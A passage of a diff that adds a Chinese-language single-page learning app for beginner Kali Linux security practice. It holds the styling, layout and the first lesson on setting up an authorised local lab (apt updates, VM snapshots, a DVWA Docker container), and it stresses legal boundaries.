@@ -1,0 +1,3510 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Kali 学堂 · 零基础网络安全实操学习台</title>
+<style>
+*{box-sizing:border-box}
+:root{
+  --bg:#f4f7fb; --panel:#ffffff; --ink:#131c2b; --ink2:#33425a; --muted:#5f7189;
+  --line:#e4eaf3; --line2:#eef2f8; --accent:#2563eb; --teal:#0d9488;
+  --soft:#eef4ff; --soft2:#f2fbf8; --ok:#15803d; --okbg:#ecfdf3;
+  --warn:#b45309; --warnbg:#fff8ec; --code:#f7f9fc; --r:14px;
+  --shadow:0 1px 2px rgba(16,32,58,.05),0 8px 24px rgba(16,32,58,.05);
+}
+html,body{margin:0;padding:0}
+body{
+  font:15px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--ink);-webkit-font-smoothing:antialiased;
+}
+code,pre,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace}
+a{color:var(--accent);text-decoration:none}
+.app{display:flex;min-height:100vh}
+
+/* ---------- sidebar ---------- */
+.sidebar{
+  width:290px;flex:0 0 290px;background:var(--panel);border-right:1px solid var(--line);
+  position:sticky;top:0;height:100vh;overflow-y:auto;padding:16px 12px 20px;
+  display:flex;flex-direction:column;gap:12px;z-index:30;
+}
+.brand{display:flex;gap:10px;align-items:center;padding:2px 6px 0}
+.logo{
+  width:38px;height:38px;border-radius:11px;display:grid;place-items:center;color:#fff;font-weight:800;
+  background:linear-gradient(135deg,#1d4ed8,#0d9488);box-shadow:0 6px 14px rgba(37,99,235,.25);font-size:17px;
+}
+.brand b{display:block;font-size:15.5px;letter-spacing:.3px;line-height:1.25}
+.brand small{color:var(--muted);font-size:11.5px}
+.side-progress{background:var(--soft);border:1px solid #dfe8ff;border-radius:12px;padding:9px 11px}
+.sp-row{display:flex;justify-content:space-between;font-size:12px;color:var(--ink2);margin-bottom:6px}
+.sp-row b{color:var(--accent)}
+.bar{height:6px;background:#dbe4f5;border-radius:99px;overflow:hidden}
+.bar i{display:block;height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#2563eb,#0d9488);transition:width .35s}
+nav{display:flex;flex-direction:column;gap:2px}
+.mod{display:flex;align-items:center;gap:7px;padding:8px 8px 6px;margin-top:6px;font-size:12px;color:var(--muted);font-weight:700;letter-spacing:.2px}
+.mod span.ic{font-size:14px}
+.mod em{margin-left:auto;font-style:normal;font-size:11px;color:#94a3b8}
+.nlink{
+  display:flex;gap:8px;align-items:flex-start;padding:7px 9px 7px 10px;border-radius:9px;
+  color:var(--ink2);font-size:13.3px;line-height:1.45;cursor:pointer;border:1px solid transparent;
+}
+.nlink:hover{background:#f5f8fe}
+.nlink.active{background:var(--soft);border-color:#d6e2ff;color:#15399e;font-weight:600}
+.dot{width:7px;height:7px;border-radius:99px;background:#cbd5e1;margin-top:7px;flex:0 0 7px}
+.dot.part{background:#93b4f8}
+.dot.done{background:#16a34a}
+.side-foot{margin-top:auto;padding:10px 6px 0;border-top:1px solid var(--line2);font-size:11.5px;color:#8a99ad;line-height:1.6}
+.link{background:none;border:0;color:var(--muted);font-size:12px;cursor:pointer;padding:0;text-decoration:underline}
+.link:hover{color:#b91c1c}
+
+/* ---------- topbar ---------- */
+.main{flex:1;min-width:0;display:flex;flex-direction:column}
+.topbar{
+  position:sticky;top:0;z-index:20;display:flex;align-items:center;gap:12px;
+  padding:11px 22px;background:rgba(255,255,255,.92);backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.icon-btn{display:none;background:#fff;border:1px solid var(--line);border-radius:9px;width:34px;height:34px;cursor:pointer;font-size:15px}
+.search{position:relative;flex:1;max-width:520px;display:flex;align-items:center;gap:8px;background:#f4f7fc;border:1px solid var(--line);border-radius:10px;padding:0 11px;height:38px}
+.search input{flex:1;border:0;background:none;outline:none;font-size:13.5px;color:var(--ink)}
+.search input::placeholder{color:#94a3b8}
+.results{position:absolute;top:44px;left:0;right:0;background:#fff;border:1px solid var(--line);border-radius:12px;box-shadow:0 16px 40px rgba(16,32,58,.14);max-height:340px;overflow:auto;display:none;padding:6px}
+.results.show{display:block}
+.res-item{padding:8px 10px;border-radius:8px;cursor:pointer;font-size:13px;color:var(--ink2)}
+.res-item:hover{background:#f2f6ff}
+.res-item small{display:block;color:#94a3b8;font-size:11.5px}
+.res-empty{padding:12px;color:#94a3b8;font-size:13px}
+.pill{margin-left:auto;font-size:12.5px;color:#1e3f8f;background:var(--soft);border:1px solid #dbe6ff;border-radius:99px;padding:5px 12px;white-space:nowrap}
+
+/* ---------- content ---------- */
+.content{flex:1;width:100%;max-width:1010px;margin:0 auto;padding:26px 30px 70px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:var(--r);padding:18px 20px;box-shadow:var(--shadow)}
+h1{font-size:26px;line-height:1.35;margin:6px 0 8px;letter-spacing:-.3px}
+h2.sec{font-size:17px;margin:34px 0 12px;display:flex;align-items:center;gap:9px}
+h2.sec small{font-weight:400;color:var(--muted);font-size:12.5px}
+h3{font-size:15.5px;margin:0}
+p{margin:8px 0}
+.muted{color:var(--muted)}
+
+/* hero */
+.hero{border-radius:18px;padding:30px 30px 26px;background:linear-gradient(135deg,#eef4ff 0%,#f2fbf8 70%,#fffaf0 100%);border:1px solid #e0e9fb;position:relative;overflow:hidden}
+.hero:after{content:"";position:absolute;right:-60px;top:-60px;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle,rgba(37,99,235,.13),transparent 70%)}
+.hero .tagline{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:#1d4ed8;background:#fff;border:1px solid #d9e5ff;border-radius:99px;padding:4px 11px}
+.hero h1{font-size:31px;margin:12px 0 10px;max-width:720px}
+.hero p{color:var(--ink2);max-width:660px}
+.hero-actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:18px}
+.btn{display:inline-flex;align-items:center;gap:7px;border-radius:10px;padding:9px 16px;font-size:13.5px;cursor:pointer;border:1px solid transparent;font-weight:600}
+.btn.primary{background:linear-gradient(135deg,#2563eb,#1d4ed8);color:#fff;box-shadow:0 6px 16px rgba(37,99,235,.24)}
+.btn.ghost{background:#fff;color:var(--ink2);border-color:var(--line)}
+.btn:hover{transform:translateY(-1px)}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:18px 0 4px}
+.stat{background:#fff;border:1px solid var(--line);border-radius:12px;padding:12px 14px}
+.stat b{display:block;font-size:21px;letter-spacing:-.5px}
+.stat span{font-size:11.5px;color:var(--muted)}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(288px,1fr));gap:14px;margin-top:14px}
+.mcard{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px 16px 14px;cursor:pointer;transition:.18s;box-shadow:var(--shadow);position:relative}
+.mcard:hover{transform:translateY(-2px);border-color:#c9d9f7;box-shadow:0 14px 30px rgba(16,32,58,.09)}
+.mcard .top{display:flex;align-items:center;gap:9px;margin-bottom:7px}
+.mcard .ic{width:32px;height:32px;border-radius:9px;display:grid;place-items:center;background:var(--soft);font-size:16px;flex:0 0 32px}
+.mcard h3{font-size:15px}
+.mcard .num{font-size:11px;color:#94a3b8;font-weight:700}
+.mcard p{font-size:12.8px;color:var(--muted);margin:2px 0 12px;min-height:38px}
+.mini{height:5px;background:#eef2f8;border-radius:99px;overflow:hidden}
+.mini i{display:block;height:100%;background:linear-gradient(90deg,#2563eb,#0d9488);width:0}
+.mmeta{display:flex;justify-content:space-between;font-size:11.5px;color:#94a3b8;margin-top:7px}
+
+/* lesson */
+.crumbs{font-size:12.5px;color:var(--muted);margin-bottom:2px}
+.meta{display:flex;gap:9px;flex-wrap:wrap;align-items:center;font-size:12px;color:var(--muted);margin-bottom:18px}
+.tag{background:#f1f5fb;border:1px solid var(--line);border-radius:7px;padding:2px 9px;font-size:11.5px;color:#4c5f79}
+.goal{background:linear-gradient(135deg,#f5f9ff,#fbfdff);border-color:#dfe8f8}
+.goal ul{margin:9px 0 0;padding-left:20px;color:var(--ink2);font-size:14px}
+.goal li{margin:5px 0}
+.concepts{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:10px;margin-top:12px}
+.concept{background:#fff;border:1px solid var(--line);border-left:3px solid var(--teal);border-radius:10px;padding:11px 13px}
+.concept b{font-size:13px;color:#0f766e}
+.concept p{font-size:12.6px;color:var(--ink2);margin:3px 0 0}
+
+.steps{display:flex;flex-direction:column;gap:14px}
+.step{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px 18px 14px;box-shadow:var(--shadow);position:relative;transition:.2s}
+.step.done{border-color:#c9efd7;background:linear-gradient(180deg,#fcfffd,#fff)}
+.step-head{display:flex;align-items:flex-start;gap:10px}
+.num{width:25px;height:25px;flex:0 0 25px;border-radius:8px;background:var(--soft);color:#1d4ed8;display:grid;place-items:center;font-size:12.5px;font-weight:800;margin-top:1px}
+.step.done .num{background:#dcfce7;color:#15803d}
+.step-head h3{flex:1;line-height:1.5}
+.check{display:flex;align-items:center;gap:5px;font-size:12px;color:var(--muted);cursor:pointer;white-space:nowrap;user-select:none;padding:3px 8px;border-radius:8px;border:1px solid transparent}
+.check:hover{background:#f6f8fc}
+.check input{accent-color:#16a34a;cursor:pointer;width:14px;height:14px}
+.cmdwrap{margin:12px 0 10px;border:1px solid #e6ecf5;border-radius:11px;overflow:hidden;background:var(--code)}
+.cmdbar{display:flex;align-items:center;gap:7px;padding:6px 10px;background:#eef2f9;border-bottom:1px solid #e3eaf4;font-size:11px;color:#7e8fa6}
+.cmdbar .d{width:7px;height:7px;border-radius:99px;background:#cfd8e6}
+.cmdbar button{margin-left:auto;background:#fff;border:1px solid #dfe6f0;border-radius:6px;font-size:11px;color:#4a5d76;padding:2px 9px;cursor:pointer}
+.cmdbar button:hover{background:#f4f8ff;color:#1d4ed8}
+.cmdwrap pre{margin:0;padding:12px 14px;overflow-x:auto;font-size:13px;line-height:1.75;color:#0f2a52}
+.why{display:flex;gap:9px;background:#f8fbff;border:1px dashed #d8e5f8;border-radius:11px;padding:10px 12px;margin:9px 0}
+.why .lab{flex:0 0 auto;font-size:11.5px;font-weight:800;color:#1d4ed8;background:#e6eeff;border-radius:6px;padding:2px 8px;height:22px;line-height:18px}
+.why p{margin:0;font-size:13.4px;color:var(--ink2)}
+.out{display:flex;gap:9px;margin:8px 0;font-size:13px;color:var(--ink2)}
+.out .lab{flex:0 0 auto;font-size:11.5px;font-weight:800;color:#0f766e;background:#e2f7f3;border-radius:6px;padding:2px 8px;height:22px;line-height:18px}
+.out p{margin:0}
+.try{border:1px solid #e3ecf9;background:#fafcff;border-radius:11px;padding:10px 12px;margin-top:10px}
+.try .th{font-size:12px;color:#4b6180;margin-bottom:7px;font-weight:600}
+.tryrow{display:flex;align-items:center;gap:7px;background:#fff;border:1px solid #dfe7f3;border-radius:9px;padding:5px 10px}
+.tryrow .pf{color:#16a34a;font-weight:700;font-size:13px}
+.tryrow input{flex:1;border:0;outline:none;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.8px;color:#0f2a52;background:none;min-width:0}
+.tryrow button{background:#1d4ed8;color:#fff;border:0;border-radius:7px;padding:5px 12px;font-size:12px;cursor:pointer}
+.trymsg{font-size:12.5px;margin-top:7px;display:none}
+.trymsg.show{display:block}
+.trymsg.good{color:#15803d}
+.trymsg.bad{color:#b45309}
+.hints{margin-top:9px}
+.hintbtn{background:#fffaf0;border:1px solid #f2e0bf;color:#96600f;border-radius:8px;padding:5px 11px;font-size:12px;cursor:pointer}
+.hintbtn:hover{background:#fff3dc}
+.hintlist{margin-top:8px;display:flex;flex-direction:column;gap:7px}
+.hint{background:#fffcf6;border-left:3px solid #f0b429;border-radius:8px;padding:8px 11px;font-size:12.8px;color:#7a5a18}
+.pit{background:#fffaf5;border:1px solid #f7e5d3;border-radius:12px;padding:13px 16px;margin-top:14px;font-size:13.4px;color:#7c4a12}
+.pit b{color:#b45309}
+.pit ul{margin:7px 0 0;padding-left:19px}
+.quiz{background:#fff;border:1px solid var(--line);border-radius:12px;padding:15px 17px;margin-top:14px}
+.quiz .q{font-size:13.8px;font-weight:600;margin-bottom:10px}
+.opt{display:block;width:100%;text-align:left;background:#fafcff;border:1px solid #e4ebf6;border-radius:9px;padding:8px 12px;font-size:13.2px;color:var(--ink2);margin-bottom:7px;cursor:pointer;transition:.15s}
+.opt:hover{background:#f2f7ff;border-color:#cddefa}
+.opt.right{background:var(--okbg);border-color:#a7e8c0;color:#136c34;font-weight:600}
+.opt.wrong{background:#fef2f2;border-color:#fbcaca;color:#b42318}
+.qexp{display:none;font-size:12.8px;color:#3d5470;background:#f7faff;border-left:3px solid #93b4f8;border-radius:8px;padding:9px 12px;margin-top:4px}
+.qexp.show{display:block}
+.lnav{display:flex;justify-content:space-between;gap:10px;margin-top:26px}
+.lnav .btn{max-width:49%}
+.lnav .btn small{display:block;color:#94a3b8;font-size:10.5px;font-weight:400}
+.foot{text-align:center;font-size:11.5px;color:#93a3b8;padding:0 20px 26px}
+.legalbar{display:flex;gap:9px;align-items:flex-start;background:#fff8f0;border:1px solid #f6e3cb;border-radius:12px;padding:11px 14px;font-size:12.5px;color:#8a5a15;margin-top:16px}
+.toast{position:fixed;left:50%;bottom:34px;transform:translateX(-50%) translateY(20px);background:#132033;color:#fff;padding:9px 16px;border-radius:10px;font-size:12.5px;opacity:0;pointer-events:none;transition:.25s;z-index:99}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+
+/* ---------- labs / tasks / deep ---------- */
+.tasks{list-style:none;margin:6px 0 0;padding:0;display:flex;flex-direction:column;gap:7px}
+.task{display:flex;gap:9px;align-items:flex-start;background:#fafcff;border:1px solid #e6eefb;border-radius:9px;padding:8px 11px;font-size:13.2px;color:var(--ink2);cursor:pointer}
+.task:hover{background:#f4f9ff}
+.task input{accent-color:#16a34a;margin-top:4px;width:14px;height:14px;cursor:pointer;flex:0 0 14px}
+.task.done{background:#f6fef9;border-color:#cbeed8;color:#14663a}
+.task .tn{font-weight:700;color:#1d4ed8;margin-right:4px}
+.task.done .tn{color:#15803d}
+.deep{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px}
+.deepcard{background:#fbfdff;border:1px solid #e2ebf8;border-left:3px solid var(--accent);border-radius:10px;padding:11px 13px}
+.deepcard b{font-size:13px;color:#1740a0}
+.deepcard p{font-size:12.7px;color:var(--ink2);margin:4px 0 0}
+.chal{background:#f8f5ff;border:1px solid #e7ddfb;border-left:3px solid #7c3aed;border-radius:12px;padding:13px 16px;margin-top:14px;font-size:13.3px;color:#4c2a86}
+.chal b{color:#6d28d9}
+.chal ol{margin:7px 0 0;padding-left:20px}
+.chal li{margin:4px 0}
+.refs{font-size:12.3px;color:var(--muted);background:#f8fafc;border:1px solid var(--line2);border-radius:10px;padding:9px 12px;margin-top:12px}
+.refs a{color:#2563eb}
+/* labs page */
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin:14px 0 4px}
+.chip{background:#fff;border:1px solid var(--line);border-radius:99px;padding:5px 13px;font-size:12.5px;color:var(--ink2);cursor:pointer}
+.chip:hover{border-color:#c9d9f7;background:#f7faff}
+.chip.on{background:#1d4ed8;border-color:#1d4ed8;color:#fff;font-weight:600}
+.labgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:14px;margin-top:14px}
+.lab{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px;box-shadow:var(--shadow);display:flex;flex-direction:column}
+.lab .lt{display:flex;align-items:center;gap:9px;margin-bottom:4px}
+.lab .lt b{font-size:15px}
+.lab .lt .badge{font-size:11px;border-radius:6px;padding:2px 8px;background:var(--soft);color:#1d4ed8;border:1px solid #dbe6ff}
+.lab .lt .badge.win{background:#f3f0ff;color:#5b21b6;border-color:#e4dcff}
+.lab p.desc{font-size:12.8px;color:var(--muted);margin:4px 0 10px}
+.lab pre{margin:0;background:var(--code);border:1px solid #e6ecf5;border-radius:9px;padding:9px 11px;font-size:11.8px;line-height:1.6;overflow-x:auto;color:#0f2a52}
+.lab .row{display:flex;gap:8px;align-items:center;margin-top:9px;flex-wrap:wrap}
+.lab .row code{background:#f4f7fc;border:1px solid #e6ecf5;border-radius:6px;padding:2px 7px;font-size:11.5px;color:#334155}
+.lab .row button{background:#fff;border:1px solid #dbe4f2;border-radius:7px;padding:3px 10px;font-size:11.5px;color:#33507a;cursor:pointer;margin-left:auto}
+.lab .row button:hover{background:#f2f7ff;color:#1d4ed8}
+.lab .pts{display:flex;gap:5px;flex-wrap:wrap;margin-top:9px}
+.lab .pts span{font-size:11px;background:#f6f8fc;border:1px solid #e9eef7;border-radius:5px;padding:1px 7px;color:#5a6d88}
+.labfoot{font-size:11.5px;color:#94a3b8;margin-top:10px;border-top:1px dashed #eef2f8;padding-top:8px}
+.scriptbox{background:#f8fbff;border:1px solid #dfe9f9;border-radius:14px;padding:16px 18px;margin-top:16px}
+.scriptbox pre{background:#fff;border:1px solid #e6ecf5;border-radius:10px;padding:12px 14px;font-size:12px;max-height:280px;overflow:auto;color:#0f2a52;margin:9px 0}
+.navspecial{background:linear-gradient(135deg,#eef4ff,#f2fbf8);border:1px solid #dbe6ff;font-weight:700;color:#15399e;margin:2px 0 6px;justify-content:center}
+.navspecial:hover{background:linear-gradient(135deg,#e4edff,#eafaf5)}
+.tiny{font-size:11.8px}
+
+/* ---------- master track ---------- */
+.mhero{border-radius:18px;padding:32px 32px 28px;background:linear-gradient(135deg,#0b1220 0%,#132a5c 55%,#0d3b3a 100%);color:#eaf1ff;position:relative;overflow:hidden;border:1px solid #1b2b4d}
+.mhero:before{content:"";position:absolute;right:-90px;top:-90px;width:300px;height:300px;border-radius:50%;background:radial-gradient(circle,rgba(56,189,248,.22),transparent 68%)}
+.mhero:after{content:"";position:absolute;left:-70px;bottom:-110px;width:260px;height:260px;border-radius:50%;background:radial-gradient(circle,rgba(13,148,136,.25),transparent 70%)}
+.mhero .tagline{display:inline-flex;gap:6px;align-items:center;font-size:12px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.18);border-radius:99px;padding:4px 11px;color:#bcd4ff}
+.mhero h1{font-size:30px;margin:14px 0 10px;color:#fff;max-width:680px;letter-spacing:-.4px}
+.mhero p{color:#b9c8e4;max-width:660px;font-size:14px}
+.mhero .hl{color:#7ee0c6;font-weight:700}
+.mhero .btn.ghost{background:rgba(255,255,255,.08);border-color:rgba(255,255,255,.22);color:#dbe7ff}
+.depth{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:20px 0 4px;position:relative;z-index:2}
+.dlayer{background:rgba(255,255,255,.055);border:1px solid rgba(255,255,255,.13);border-radius:12px;padding:12px 13px}
+.dlayer b{display:block;font-size:12.5px;color:#fff;margin-bottom:3px}
+.dlayer small{font-size:11.5px;color:#9fb3d4;line-height:1.5;display:block}
+.dlayer em{font-style:normal;font-size:10.5px;color:#7ee0c6;letter-spacing:.5px;text-transform:uppercase}
+
+.levels{display:grid;grid-template-columns:repeat(6,1fr);gap:9px;margin-top:14px}
+.lvcard{background:#fff;border:1px solid var(--line);border-radius:13px;padding:13px 12px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.lvcard:before{content:"";position:absolute;left:0;top:0;width:100%;height:3px;background:linear-gradient(90deg,#2563eb,#0d9488)}
+.lvcard b.code{display:inline-block;font-size:11px;color:#fff;background:#15399e;border-radius:5px;padding:1px 6px;letter-spacing:.5px}
+.lvcard h4{font-size:13.5px;margin:8px 0 5px}
+.lvcard p{font-size:11.9px;color:var(--muted);margin:0 0 8px;line-height:1.55}
+.lvcard ul{margin:0;padding-left:15px}
+.lvcard li{font-size:11.6px;color:var(--ink2);margin:3px 0;line-height:1.5}
+.lvcard .gate{margin-top:8px;font-size:11.3px;color:#0f766e;background:var(--soft2);border:1px dashed #b8e6dc;border-radius:7px;padding:5px 7px}
+
+.method{display:grid;grid-template-columns:repeat(2,1fr);gap:11px;margin-top:14px}
+.mcard2{background:#fff;border:1px solid var(--line);border-left:3px solid #2563eb;border-radius:11px;padding:13px 15px;box-shadow:var(--shadow)}
+.mcard2 b{font-size:13.4px;color:#1740a0}
+.mcard2 p{font-size:12.8px;color:var(--ink2);margin:5px 0 0}
+
+.topic{background:#fff;border:1px solid var(--line);border-radius:13px;margin-bottom:10px;box-shadow:var(--shadow);overflow:hidden}
+.topic[open]{border-color:#c9d9f7}
+.topic>summary{cursor:pointer;padding:14px 16px;display:flex;gap:11px;align-items:flex-start;list-style:none}
+.topic>summary::-webkit-details-marker{display:none}
+.topic>summary .tic{width:30px;height:30px;flex:0 0 30px;border-radius:9px;display:grid;place-items:center;background:var(--soft);font-size:15px}
+.topic>summary .tt{flex:1;min-width:0}
+.topic>summary h4{font-size:14.2px;margin:0 0 3px;line-height:1.45}
+.topic>summary .q{font-size:12.3px;color:var(--muted);line-height:1.55}
+.topic>summary .arw{color:#94a3b8;font-size:12px;transition:.2s;margin-top:6px}
+.topic[open]>summary .arw{transform:rotate(90deg)}
+.tbody{padding:2px 16px 16px;border-top:1px solid var(--line2)}
+.tbody h5{font-size:13px;margin:15px 0 4px;color:#15399e;display:flex;gap:6px;align-items:center}
+.tbody p{font-size:13.2px;color:var(--ink2);margin:4px 0}
+.tbody p code, .tbody li code{background:#eef3fb;border:1px solid #e0e8f4;border-radius:5px;padding:1px 5px;font-size:12px;color:#1e3f8f}
+.tbody ul{padding-left:19px;margin:6px 0}
+.tbody li{font-size:12.9px;color:var(--ink2);margin:4px 0}
+.tcode{background:#0e1729;color:#dbe7ff;border-radius:10px;padding:12px 14px;overflow:auto;font-size:12.3px;line-height:1.6;margin:8px 0}
+.tcode code{white-space:pre}
+.tblock{background:#f8fbff;border:1px solid #e3ecfa;border-left:3px solid #0d9488;border-radius:9px;padding:10px 13px;margin:10px 0 0;font-size:12.8px;color:#155e56}
+.tblock b{display:block;font-size:11.5px;color:#0f766e;letter-spacing:.4px;margin-bottom:3px}
+.tblock.check{background:#fbfaff;border-color:#e8e2fb;border-left-color:#7c3aed;color:#4c2a86}
+.tblock.check b{color:#6d28d9}
+.tblock.check ul{padding-left:17px;margin:2px 0}
+.tblock.check li{font-size:12.6px;color:#4c2a86}
+.tread{font-size:12px;color:#6b7d95;margin-top:10px;line-height:1.7}
+.tread b{color:#41546e}
+
+.proj{background:#fff;border:1px solid var(--line);border-radius:13px;padding:16px 17px;box-shadow:var(--shadow);border-top:3px solid #7c3aed}
+.proj .ph{display:flex;gap:9px;align-items:center;margin-bottom:6px}
+.proj .ph .ic{width:30px;height:30px;border-radius:9px;background:#f6f2ff;display:grid;place-items:center;font-size:15px}
+.proj h4{font-size:14.2px;margin:0}
+.proj .why{font-size:12.7px;color:var(--muted);margin:4px 0 9px}
+.proj ol{padding-left:19px;margin:6px 0}
+.proj li{font-size:12.8px;color:var(--ink2);margin:4px 0}
+.proj .del{margin-top:10px;background:#faf8ff;border:1px dashed #ddd0f7;border-radius:8px;padding:8px 11px;font-size:12.2px;color:#4c2a86}
+.proj .del b{color:#6d28d9}
+
+.drill{width:100%;border-collapse:collapse;margin-top:12px;font-size:12.9px}
+.drill th{text-align:left;font-size:11.5px;color:var(--muted);font-weight:700;padding:8px 10px;background:#f7f9fd;border-bottom:1px solid var(--line)}
+.drill td{padding:9px 10px;border-bottom:1px solid var(--line2);color:var(--ink2);vertical-align:top}
+.drill tr:last-child td{border-bottom:0}
+.drill td b{color:#15399e}
+
+.qa{background:#fff;border:1px solid var(--line);border-radius:12px;margin-bottom:8px;overflow:hidden}
+.qa>summary{cursor:pointer;padding:10px 14px;font-size:13.2px;font-weight:600;color:var(--ink);list-style:none;display:flex;gap:8px}
+.qa>summary::-webkit-details-marker{display:none}
+.qa>summary:before{content:"Q";font-size:11px;color:#fff;background:#2563eb;border-radius:5px;width:17px;height:17px;display:grid;place-items:center;flex:0 0 17px;margin-top:3px}
+.qa .ans{padding:0 14px 13px 39px;font-size:12.9px;color:var(--ink2)}
+.qa .ans b{color:#0f766e}
+
+.trail{background:linear-gradient(135deg,#f6f9ff,#f4fdfa);border:1px solid #dbe6ff;border-radius:13px;padding:14px 16px;margin-top:16px}
+.trail b.h{display:block;font-size:13.2px;color:#15399e;margin-bottom:8px}
+.trail .titem{display:flex;gap:9px;align-items:flex-start;padding:7px 9px;border-radius:8px;background:#fff;border:1px solid #e6eefb;margin-bottom:6px;cursor:pointer;font-size:12.7px;color:var(--ink2)}
+.trail .titem:hover{border-color:#c2d6f8;background:#fbfdff}
+.trail .titem .ttl{font-weight:600;color:#15399e}
+.trail .titem small{display:block;color:#8496ad;font-size:11.5px;font-weight:400}
+
+@media (max-width:1100px){.levels{grid-template-columns:repeat(3,1fr)}.depth{grid-template-columns:repeat(2,1fr)}}
+@media (max-width:900px){
+  .sidebar{position:fixed;left:0;top:0;transform:translateX(-102%);transition:transform .25s;box-shadow:0 20px 60px rgba(16,32,58,.2)}
+  .sidebar.open{transform:none}
+  .icon-btn{display:block}
+  .content{padding:18px 16px 60px}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .hero{padding:22px 20px}
+  .hero h1{font-size:24px}
+  .pill{display:none}
+}
+</style>
+</head>
+<body>
+<div class="app">
+  <aside class="sidebar" id="sidebar">
+    <div class="brand">
+      <div class="logo">K</div>
+      <div><b>Kali 学堂</b><small>零基础 · 实操 · 全程讲为什么</small></div>
+    </div>
+    <div class="side-progress">
+      <div class="sp-row"><span>总进度</span><b id="sp-text">0%</b></div>
+      <div class="bar"><i id="sp-bar"></i></div>
+    </div>
+    <nav id="nav"></nav>
+    <div class="side-foot">
+      <button class="link" id="btn-reset">重置全部进度</button>
+      <div style="margin-top:6px">⚠️ 所有实验仅限自有设备或书面授权的目标。</div>
+    </div>
+  </aside>
+
+  <main class="main">
+    <header class="topbar">
+      <button class="icon-btn" id="btn-menu" aria-label="菜单">☰</button>
+      <div class="search">
+        <span style="color:#94a3b8;font-size:13px">🔍</span>
+        <input id="q" placeholder="搜索方向 / 工具 / 关键词：nmap、SQL 注入、提权、取证…" autocomplete="off">
+        <div class="results" id="results"></div>
+      </div>
+      <span class="pill" id="done-pill">已完成 0 节</span>
+    </header>
+    <div class="content" id="view"></div>
+    <footer class="foot">Kali 学堂 · 学习用本地单页应用，进度保存在本机浏览器 · 技术本身中立，使用它的人要负责</footer>
+  </main>
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+const DATA = [
+/* ================= 第 0 章 ================= */
+{
+  id:'m0', no:'0', icon:'🧱', name:'起步：环境、边界与手感', short:'起步与环境',
+  desc:'装好 Kali、立起靶场、学会 Linux 手感，顺便把「合法」这条线刻进脑子。',
+  lessons:[
+  {
+    id:'l0-1', title:'搭一个能随时回滚的合法靶场', time:'25 分钟', level:'入门',
+    tags:['Kali','虚拟机','DVWA','快照'],
+    goal:[
+      '说清「授权测试」与「非法入侵」的分界线',
+      '在虚拟机里跑起 Kali，并会做快照',
+      '用 Docker 起一个 DVWA 靶场并成功访问'
+    ],
+    concepts:[
+      {t:'授权', d:'书面、范围明确、有期限的许可才是渗透测试。没有授权，技术再强也只是犯罪。'},
+      {t:'靶场', d:'故意留有漏洞的练习系统（DVWA、Juice Shop、THM 房间）。打它不违法，因为它就是造出来给你打的。'},
+      {t:'快照', d:'虚拟机的存档点。渗透会改配置、装后门、搞崩系统，快照让你一键回到干净状态。'},
+      {t:'NAT / 仅主机网络', d:'虚拟机常用网段 192.168.x.x。靶场和 Kali 放同一张虚拟网里，才不会误扫到真实网络。'}
+    ],
+    steps:[
+      {title:'先写下你的实验边界',
+       cmd:'',
+       why:'所有技术动作都发生在「授权范围」内。先写清三件事：目标是谁的、在哪个网段、什么手法不做（比如拒绝服务）。边界写下来，后面每一步才不踩线。',
+       out:'笔记顶部三行字：目标 / 网段 / 禁止手法。',
+       hints:['把「我要学渗透」翻译成「我要在我自己的 192.168.56.0/24 靶场里练」。','写成一句话：仅测试 192.168.56.0/24 内我自建的靶机，不做 DoS、不打公网目标。']},
+      {title:'启动 Kali 并更新软件源',
+       cmd:'sudo apt update && sudo apt full-upgrade -y',
+       why:'update 只刷新「软件清单」，upgrade 才真正安装新版本。安全工具严重依赖最新的漏洞库和脚本，半年前的系统会让你遇到一堆莫名其妙的报错。',
+       out:'最后一行出现升级完成的统计，没有 E: 开头的错误。',
+       hints:['如果卡在「Could not resolve」说明虚拟机没网，先检查虚拟机的网络模式是不是 NAT。','遇到 GPG 或 404 报错，通常是源过期，先跑 sudo apt update --fix-missing 再重试。'],
+       try:{need:['apt','update'], hint:'命令里应该有 apt 子命令 update，以及一串升级动作。'}},
+      {title:'打一个快照，给自己留后路',
+       cmd:'# VirtualBox：菜单「控制」→「生成备份」\n# VMware：菜单「虚拟机」→「快照」→「拍摄快照」',
+       why:'你接下来会改网络配置、装一堆工具、甚至把自己锁在系统外。快照让「搞坏了」这件事从灾难变成一次重启。这是新手最容易被忽略、却最救命的习惯。',
+       out:'快照列表里出现一条带日期的记录，名字里写明当前状态。',
+       hints:['命名带上日期和状态，比如 2026-10-30 clean-install，回滚时才不会选错。','做完立刻试一次回滚，确认你真的会用——别等到出事那天才发现不会。']},
+      {title:'用 Docker 起一个 DVWA 靶场',
+       cmd:'sudo systemctl start docker\ndocker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa',
+       why:'-d 让容器在后台跑，-p 8080:80 把宿主机的 8080 端口映射到容器的 80 端口。这样你访问 http://127.0.0.1:8080 就能打开一个「专门用来被打」的网站，全程不出本机。',
